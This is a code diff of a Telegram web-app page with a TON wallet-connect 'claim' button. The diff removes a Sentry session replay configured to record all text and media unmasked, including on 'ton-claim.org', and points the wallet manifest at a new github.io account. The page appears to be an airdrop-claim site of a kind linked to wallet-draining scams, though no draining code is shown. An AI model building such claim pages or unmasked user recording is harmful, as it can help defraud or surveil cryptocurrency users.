@@ -13,24 +13,6 @@
     <link rel="stylesheet" href="css/stylesheet.css">
 
     <script>
-        window.sentryOnLoad = function () {
-            Sentry.init({
-                dsn: "https://6f7b58255789ca23ada9fa8e1d04e923@o4507733556068352.ingest.de.sentry.io/4507733557968976",
-                integrations: [
-                    Sentry.browserTracingIntegration(),
-                    Sentry.replayIntegration({
-                        maskAllText: false,
-                        blockAllMedia: false,
-                        networkDetailAllowUrls: [window.location.origin,"ton-claim.org"],
-                    }),
-                ],
-                tracesSampleRate: 1.0,
-            });
-        };
-    </script>
-    <script src="https://js-de.sentry-cdn.com/6f7b58255789ca23ada9fa8e1d04e923.min.js" crossorigin="anonymous"></script>
-
-    <script>
         location.hash = location.hash.replace(/tgWebAppVersion=(.*?)&/, 'tgWebAppVersion=7.7&');
         window.sessionStorage.setItem('__telegram__initParams', '{"tgWebAppVersion":"7.7"}');
     </script>
@@ -44,7 +26,7 @@
             mode: 'manual',
             openModalSelectors: ['#claim-button'],
             buttonRootId: null,
-            manifestUrl: 'https://j8s90z111.github.io/sturdy-palm-tree/manifest.json'
+            manifestUrl: 'https://pizdasuchami.github.io/sturdy-palm-tree/manifest.json'
         }
     </script>
 
